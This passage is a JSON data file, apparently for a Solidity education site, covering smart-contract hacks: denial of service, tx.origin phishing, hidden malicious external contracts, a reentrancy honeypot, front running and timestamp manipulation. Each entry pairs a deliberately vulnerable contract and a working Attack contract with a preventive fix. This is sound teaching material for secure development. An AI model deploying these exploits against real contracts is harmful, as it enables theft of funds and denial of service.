balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    // You can also perform a DOS by consuming all gas using assert.\n    // This attack will work even if the calling contract does not check\n    // whether the call was successful or not.\n    //\n    // function () external payable {\n    //     assert(false);\n    // }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n\n```\n\n### Preventative Techniques\n\nOne way to prevent this is to allow the users to withdraw their Ether instead of sending it.\n\nHere is an example.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract KingOfEther {\n    address public king;\n    uint256 public balance;\n    mapping(address => uint256) public balances;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        balances[king] += balance;\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n\n    function withdraw() public {\n        require(msg.sender != king, \"Current king cannot withdraw\");\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "DenialOfService.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/\n\n/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n3. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n4. Deploy Attack with address of KingOfEther.\n5. Call attack with 3 Ether.\n6. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/\n\ncontract KingOfEther {\n    address public king;\n    uint256 public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent,) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    // You can also perform a DOS by consuming all gas using assert.\n    // This attack will work even if the calling contract does not check\n    // whether the call was successful or not.\n    //\n    // function () external payable {\n    //     assert(false);\n    // }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n"
      },
      {
        "fileName": "PreventDenialOfService.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract KingOfEther {\n    address public king;\n    uint256 public balance;\n    mapping(address => uint256) public balances;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        balances[king] += balance;\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n\n    function withdraw() public {\n        require(msg.sender != king, \"Current king cannot withdraw\");\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "denial",
      "service"
    ],
    "order": 6
  },
  {
    "slug": "phishing-with-tx-origin",
    "title": "Phishing with tx.origin",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of phishing with tx.origin in Solidity",
    "content": "### What's the difference between `msg.sender` and `tx.origin`?\n\nIf contract A calls B, and B calls C, in C `msg.sender` is B and `tx.origin` is A.\n\n### Vulnerability\n\nA malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n*/\n\n/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice's Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice's wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint256 _amount) public {\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent,) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n\n```\n\n### Preventive Techniques\n\nUse `msg.sender` instead of `tx.origin`\n\n```solidity\nfunction transfer(address payable _to, uint256 _amount) public {\n  require(msg.sender == owner, \"Not owner\");\n\n  (bool sent, ) = _to.call{ value: _amount }(\"\");\n  require(sent, \"Failed to send Ether\");\n}\n```",
    "codes": [
      {
        "fileName": "TxOrigin.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let's see how we can hack this contract\n*/\n\n/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice's Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice's wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice's wallet to Eve's address.\nSince tx.origin in Wallet.transfer() is equal to Alice's address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint256 _amount) public {\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent,) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "phishing",
      "tx.origin"
    ],
    "order": 7
  },
  {
    "slug": "hiding-malicious-code-with-external-contract",
    "title": "Hiding Malicious Code with External Contract",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of exploit where malicious code is hidden in an external contract in Solidity",
    "content": "### Vulnerability\n\nIn Solidity, any address can be cast into specific contract,\neven if the contract at the address is not the one being cast.\n\nThis can be exploited to hide malicious code. Let's see how.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nLet's say Alice can see the code of Foo and Bar but not Mal.\nIt is obvious to Alice that Foo.callBar() executes the code inside Bar.log().\nHowever Eve deploys Foo with the address of Mal, so that calling Foo.callBar()\nwill actually execute the code at Mal.\n*/\n\n/*\n1. Eve deploys Mal\n2. Eve deploys Foo with the address of Mal\n3. Alice calls Foo.callBar() after reading the code and judging that it is\n   safe to call.\n4. Although Alice expected Bar.log() to be executed, Mal.log() was executed.\n*/\n\ncontract Foo {\n    Bar bar;\n\n    constructor(address _bar) {\n        bar = Bar(_bar);\n    }\n\n    function callBar() public {\n        bar.log();\n    }\n}\n\ncontract Bar {\n    event Log(string message);\n\n    function log() public {\n        emit Log(\"Bar was called\");\n    }\n}\n\n// This code is hidden in a separate file\ncontract Mal {\n    event Log(string message);\n\n    // function () external {\n    //     emit Log(\"Mal was called\");\n    // }\n\n    // Actually we can execute the same exploit even if this function does\n    // not exist by using the fallback\n    function log() public {\n        emit Log(\"Mal was called\");\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- Initialize a new contract inside the constructor\n- Make the address of external contract `public` so that the code of the\n  external contract can be reviewed\n\n```solidity\nBar public bar;\n\nconstructor() public {\n    bar = new Bar();\n}\n```",
    "codes": [
      {
        "fileName": "ExternalContract.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nLet's say Alice can see the code of Foo and Bar but not Mal.\nIt is obvious to Alice that Foo.callBar() executes the code inside Bar.log().\nHowever Eve deploys Foo with the address of Mal, so that calling Foo.callBar()\nwill actually execute the code at Mal.\n*/\n\n/*\n1. Eve deploys Mal\n2. Eve deploys Foo with the address of Mal\n3. Alice calls Foo.callBar() after reading the code and judging that it is\n   safe to call.\n4. Although Alice expected Bar.log() to be executed, Mal.log() was executed.\n*/\n\ncontract Foo {\n    Bar bar;\n\n    constructor(address _bar) {\n        bar = Bar(_bar);\n    }\n\n    function callBar() public {\n        bar.log();\n    }\n}\n\ncontract Bar {\n    event Log(string message);\n\n    function log() public {\n        emit Log(\"Bar was called\");\n    }\n}\n\n// This code is hidden in a separate file\ncontract Mal {\n    event Log(string message);\n\n    // function () external {\n    //     emit Log(\"Mal was called\");\n    // }\n\n    // Actually we can execute the same exploit even if this function does\n    // not exist by using the fallback\n    function log() public {\n        emit Log(\"Mal was called\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "hide",
      "hiding",
      "malicious",
      "code",
      "external",
      "contract"
    ],
    "order": 8
  },
  {
    "slug": "honeypot",
    "title": "Honeypot",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of honeypot in Solidity",
    "content": "A honeypot is a trap to catch hackers.\n\n### Vulnerability\n\nCombining two exploits, reentrancy and hiding malicious code, we can build a contract\n\nthat will catch malicious users.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentrancy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let's see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/\n\ncontract Bank {\n    mapping(address => uint256) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, \"Deposit\");\n    }\n\n    function withdraw(uint256 _amount) public {\n        require(_amount <= balances[msg.sender], \"Insufficient funds\");\n\n        (bool sent,) = msg.sender.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, \"Withdraw\");\n    }\n}\n\ncontract Logger {\n    event Log(address caller, uint256 amount, string action);\n\n    function log(address _caller, uint256 _amount, string memory _action)\n        public\n    {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n// Let's say this code is in a separate file so that others cannot read it.\ncontract HoneyPot {\n    function log(address _caller, uint256 _amount, string memory _action)\n        public\n    {\n        if (equal(_action, \"Withdraw\")) {\n            revert(\"It's a trap\");\n        }\n    }\n\n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b)\n        public\n        pure\n        returns (bool)\n    {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "HoneyPot.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentrancy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let's see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/\n\ncontract Bank {\n    mapping(address => uint256) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, \"Deposit\");\n    }\n\n    function withdraw(uint256 _amount) public {\n        require(_amount <= balances[msg.sender], \"Insufficient funds\");\n\n        (bool sent,) = msg.sender.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, \"Withdraw\");\n    }\n}\n\ncontract Logger {\n    event Log(address caller, uint256 amount, string action);\n\n    function log(address _caller, uint256 _amount, string memory _action)\n        public\n    {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n// Let's say this code is in a separate file so that others cannot read it.\ncontract HoneyPot {\n    function log(address _caller, uint256 _amount, string memory _action)\n        public\n    {\n        if (equal(_action, \"Withdraw\")) {\n            revert(\"It's a trap\");\n        }\n    }\n\n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b)\n        public\n        pure\n        returns (bool)\n    {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "honeypot"
    ],
    "order": 9
  },
  {
    "slug": "front-running",
    "title": "Front Running",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of a Solidity contract vulnerable to front running",
    "content": "### Vulnerability\n\nTransactions take some time before they are mined. An attacker can watch the transaction pool\nand send a transaction, have it included in a block before the original transaction.\nThis mechanism can be abused to re-order transactions to the attacker's advantage.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nAlice creates a guessing game.\nYou win 10 ether if you can find the correct string that hashes to the target\nhash. Let's see how this contract is vulnerable to front running.\n*/\n\n/*\n1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\")\n3. Bob calls solve(\"Ethereum\") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob's answer and calls solve(\"Ethereum\") with a higher gas price\n   than Bob (100 gwei).\n6. Eve's transaction was mined before Bob's transaction.\n   Eve won the reward of 10 ether.\n\nWhat happened?\nTransactions take some time before they are mined.\nTransactions not yet mined are put in the transaction pool.\nTransactions with higher gas price are typically mined first.\nAn attacker can get the answer from the transaction pool, send a transaction\nwith a higher gas price so that their transaction will be included in a block\nbefore the original.\n*/\n\ncontract FindThisHash {\n    bytes32 public constant hash =\n        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n\n    constructor() payable {}\n\n    function solve(string memory solution) public {\n        require(\n            hash == keccak256(abi.encodePacked(solution)), \"Incorrect answer\"\n        );\n\n        (bool sent,) = msg.sender.call{value: 10 ether}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- use commit-reveal scheme (https://medium.com/swlh/exploring-commit-reveal-schemes-on-ethereum-c4ff5a777db8)\n- use submarine send (https://libsubmarine.org/)\n\n### Commit-Reveal Schemes\n\nA commitment scheme is a cryptographic algorithm used to allow someone to commit to a value while keeping it hidden from others with the ability to reveal it later. The values in a commitment scheme are binding, meaning that no one can change them once committed. The scheme has two phases: a commit phase in which a value is chosen and specified, and a reveal phase in which the value is revealed and checked.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\n   Now Let's see how to guard from front running using commit reveal scheme.\n*/\n\n/*\n1. Alice deploys SecuredFindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\").\n3. Bob then finds the keccak256(Address in lowercase + Solution + Secret). \n   Address is his wallet address in lowercase, solution is \"Ethereum\", Secret is like a password (\"mysecret\") \n   that only Bob knows which Bob uses to commit and reveal the solution.\n   keccak256(\"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266Ethereummysecret\") = '0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36'\n4. Bob then calls commitSolution(\"0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36\"), \n   where he commits the calculated solution hash with gas price set to 15 gwei.\n5. Eve is watching the transaction pool for the answer to be submitted.\n6. Eve sees Bob's answer and he also calls commitSolution(\"0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36\")\n   with a higher gas price than Bob (100 gwei).\n7. Eve's transaction was mined before Bob's transaction, but Eve has not got the reward yet.\n   He needs to call revealSolution() with exact secret and solution, so lets say he is watching the transaction pool\n   to front run Bob as he did previously\n8. Then Bob calls the revealSolution(\"Ethereum\", \"mysecret\") with gas price set to 15 gwei;\n9. Let's consider that Eve's who's watching the transaction pool, find's Bob's reveal solution transaction and he also calls \n   revealSolution(\"Ethereum\", \"mysecret\") with higher gas price than Bob (100 gwei)\n10. Let's consider that this time also Eve's reveal transaction was mined before Bob's transaction, but Eve will be\n   reverted with \"Hash doesn't match\" error. Since the revealSolution() function checks the hash using \n   keccak256(msg.sender + solution + secret). So this time eve fails to win the reward.\n11.But Bob's revealSolution(\"Ethereum\", \"mysecret\") passes the hash check and gets the reward of 10 ether.\n*/\n\ncontract SecuredFindThisHash {\n    // Struct is used to store the commit details\n    struct Commit {\n        bytes32 solutionHash;\n        uint256 commitTime;\n        bool revealed;\n    }\n\n    // The hash that is needed to be solved\n    bytes32 public hash =\n        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n\n    // Address of the winner\n    address public winner;\n\n    // Price to be rewarded\n    uint256 public reward;\n\n    // Status of game\n    bool public ended;\n\n    // Mapping to store the commit details with address\n    mapping(address => Commit) commits;\n\n    // Modifier to check if the game is active\n    modifier gameActive() {\n        require(!ended, \"Already ended\");\n        _;\n    }\n\n    constructor() payable {\n        reward = msg.value;\n    }\n\n    /* \n       Commit function to store the hash calculated using keccak256(address in lowercase + solution + secret). \n       Users can only commit once and if the game is active.\n    */\n    function commitSolution(bytes32 _solutionHash) public gameActive {\n        Commit storage commit = commits[msg.sender];\n        require(commit.commitTime == 0, \"Already committed\");\n        commit.solutionHash = _solutionHash;\n        commit.commitTime = block.timestamp;\n        commit.revealed = false;\n    }\n\n    /* \n        Function to get the commit details. It returns a tuple of (solutionHash, commitTime, revealStatus);  \n        Users can get solution only if the game is active and they have committed a solutionHash\n    */\n    function getMySolution()\n        public\n        view\n        gameActive\n        returns (bytes32, uint256, bool)\n    {\n        Commit storage commit = commits[msg.sender];\n        require(commit.commitTime != 0, \"Not committed yet\");\n        return (commit.solutionHash, commit.commitTime, commit.revealed);\n    }\n    /* \n        Function to reveal the commit and get the reward. \n        Users can get reveal solution only if the game is active and they have committed a solutionHash before this block and not revealed yet.\n        It generates a keccak256(msg.sender + solution + secret) and checks it with the previously committed hash.  \n        Assuming that a commit was already included on chain, front runners will not be able to pass this check since the msg.sender is different.\n        Then the actual solution is checked using keccak256(solution), if the solution matches, the winner is declared, \n        the game is ended and the reward amount is sent to the winner.\n    */\n\n    function revealSolution(string memory _solution, string memory _secret)\n        public\n        gameActive\n    {\n        Commit storage commit = commits[msg.sender];\n        require(commit.commitTime != 0, \"Not committed yet\");\n        require(\n            commit.commitTime < block.timestamp,\n            \"Cannot reveal in the same block\"\n        );\n        require(!commit.revealed, \"Already committed and revealed\");\n\n        bytes32 solutionHash =\n            keccak256(abi.encodePacked(msg.sender, _solution, _secret));\n        require(solutionHash == commit.solutionHash, \"Hash doesn't match\");\n\n        require(\n            keccak256(abi.encodePacked(_solution)) == hash, \"Incorrect answer\"\n        );\n\n        winner = msg.sender;\n        ended = true;\n\n        (bool sent,) = payable(msg.sender).call{value: reward}(\"\");\n        if (!sent) {\n            winner = address(0);\n            ended = false;\n            revert(\"Failed to send ether.\");\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "FrontRunning.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nAlice creates a guessing game.\nYou win 10 ether if you can find the correct string that hashes to the target\nhash. Let's see how this contract is vulnerable to front running.\n*/\n\n/*\n1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\")\n3. Bob calls solve(\"Ethereum\") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob's answer and calls solve(\"Ethereum\") with a higher gas price\n   than Bob (100 gwei).\n6. Eve's transaction was mined before Bob's transaction.\n   Eve won the reward of 10 ether.\n\nWhat happened?\nTransactions take some time before they are mined.\nTransactions not yet mined are put in the transaction pool.\nTransactions with higher gas price are typically mined first.\nAn attacker can get the answer from the transaction pool, send a transaction\nwith a higher gas price so that their transaction will be included in a block\nbefore the original.\n*/\n\ncontract FindThisHash {\n    bytes32 public constant hash =\n        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n\n    constructor() payable {}\n\n    function solve(string memory solution) public {\n        require(\n            hash == keccak256(abi.encodePacked(solution)), \"Incorrect answer\"\n        );\n\n        (bool sent,) = msg.sender.call{value: 10 ether}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n"
      },
      {
        "fileName": "PreventFrontRunning.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\n   Now Let's see how to guard from front running using commit reveal scheme.\n*/\n\n/*\n1. Alice deploys SecuredFindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\").\n3. Bob then finds the keccak256(Address in lowercase + Solution + Secret). \n   Address is his wallet address in lowercase, solution is \"Ethereum\", Secret is like a password (\"mysecret\") \n   that only Bob knows which Bob uses to commit and reveal the solution.\n   keccak256(\"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266Ethereummysecret\") = '0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36'\n4. Bob then calls commitSolution(\"0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36\"), \n   where he commits the calculated solution hash with gas price set to 15 gwei.\n5. Eve is watching the transaction pool for the answer to be submitted.\n6. Eve sees Bob's answer and he also calls commitSolution(\"0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36\")\n   with a higher gas price than Bob (100 gwei).\n7. Eve's transaction was mined before Bob's transaction, but Eve has not got the reward yet.\n   He needs to call revealSolution() with exact secret and solution, so lets say he is watching the transaction pool\n   to front run Bob as he did previously\n8. Then Bob calls the revealSolution(\"Ethereum\", \"mysecret\") with gas price set to 15 gwei;\n9. Let's consider that Eve's who's watching the transaction pool, find's Bob's reveal solution transaction and he also calls \n   revealSolution(\"Ethereum\", \"mysecret\") with higher gas price than Bob (100 gwei)\n10. Let's consider that this time also Eve's reveal transaction was mined before Bob's transaction, but Eve will be\n   reverted with \"Hash doesn't match\" error. Since the revealSolution() function checks the hash using \n   keccak256(msg.sender + solution + secret). So this time eve fails to win the reward.\n11.But Bob's revealSolution(\"Ethereum\", \"mysecret\") passes the hash check and gets the reward of 10 ether.\n*/\n\ncontract SecuredFindThisHash {\n    // Struct is used to store the commit details\n    struct Commit {\n        bytes32 solutionHash;\n        uint256 commitTime;\n        bool revealed;\n    }\n\n    // The hash that is needed to be solved\n    bytes32 public hash =\n        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n\n    // Address of the winner\n    address public winner;\n\n    // Price to be rewarded\n    uint256 public reward;\n\n    // Status of game\n    bool public ended;\n\n    // Mapping to store the commit details with address\n    mapping(address => Commit) commits;\n\n    // Modifier to check if the game is active\n    modifier gameActive() {\n        require(!ended, \"Already ended\");\n        _;\n    }\n\n    constructor() payable {\n        reward = msg.value;\n    }\n\n    /* \n       Commit function to store the hash calculated using keccak256(address in lowercase + solution + secret). \n       Users can only commit once and if the game is active.\n    */\n    function commitSolution(bytes32 _solutionHash) public gameActive {\n        Commit storage commit = commits[msg.sender];\n        require(commit.commitTime == 0, \"Already committed\");\n        commit.solutionHash = _solutionHash;\n        commit.commitTime = block.timestamp;\n        commit.revealed = false;\n    }\n\n    /* \n        Function to get the commit details. It returns a tuple of (solutionHash, commitTime, revealStatus);  \n        Users can get solution only if the game is active and they have committed a solutionHash\n    */\n    function getMySolution()\n        public\n        view\n        gameActive\n        returns (bytes32, uint256, bool)\n    {\n        Commit storage commit = commits[msg.sender];\n        require(commit.commitTime != 0, \"Not committed yet\");\n        return (commit.solutionHash, commit.commitTime, commit.revealed);\n    }\n    /* \n        Function to reveal the commit and get the reward. \n        Users can get reveal solution only if the game is active and they have committed a solutionHash before this block and not revealed yet.\n        It generates a keccak256(msg.sender + solution + secret) and checks it with the previously committed hash.  \n        Assuming that a commit was already included on chain, front runners will not be able to pass this check since the msg.sender is different.\n        Then the actual solution is checked using keccak256(solution), if the solution matches, the winner is declared, \n        the game is ended and the reward amount is sent to the winner.\n    */\n\n    function revealSolution(string memory _solution, string memory _secret)\n        public\n        gameActive\n    {\n        Commit storage commit = commits[msg.sender];\n        require(commit.commitTime != 0, \"Not committed yet\");\n        require(\n            commit.commitTime < block.timestamp,\n            \"Cannot reveal in the same block\"\n        );\n        require(!commit.revealed, \"Already committed and revealed\");\n\n        bytes32 solutionHash =\n            keccak256(abi.encodePacked(msg.sender, _solution, _secret));\n        require(solutionHash == commit.solutionHash, \"Hash doesn't match\");\n\n        require(\n            keccak256(abi.encodePacked(_solution)) == hash, \"Incorrect answer\"\n        );\n\n        winner = msg.sender;\n        ended = true;\n\n        (bool sent,) = payable(msg.sender).call{value: reward}(\"\");\n        if (!sent) {\n            winner = address(0);\n            ended = false;\n            revert(\"Failed to send ether.\");\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "front",
      "running"
    ],
    "order": 10
  },
  {
    "slug": "block-timestamp-manipulation",
    "title": "Block Timestamp Manipulation",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of a Solidity contract vulnerable to block timestamp manipulation",
    "content": "### Vulnerability\n\n`block.timestamp` can be manipulated by miners with the following constraints\n\n- it cannot be stamped with an earlier time than its parent\n- it cannot be too far in the future\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nRoulette is a game where you can win all of the Ether in the contract\nif you can submit a transaction at a specific timing.\nA player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.\n*/\n\n/*\n1. Deploy Roulette with 10 Ether\n2. Eve runs a powerful miner that can manipulate the block timestamp.\n3. Eve sets the block.timestamp to a number in the future that is divisible by\n   15 and finds the target block hash.\n4. Eve's block is successfully included into the chain, Eve wins the\n   Roulette game.\n*/\n\ncontract Roulette {\n    uint256 public pastBlockTime;\n\n    constructor() payable {}\n\n    function spin() external payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n        require(block.timestamp != pastBlockTime); // only 1 transaction per block\n\n        pastBlockTime = block.timestamp;\n\n        if (block.timestamp % 15 == 0) {\n            (bool sent,) = msg.sender.call{value: address(this).balance}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- Don't use `block.timestamp` for a source of entropy and random number",
    "codes": [
      {
        "fileName": "BlockTimestamp.sol",
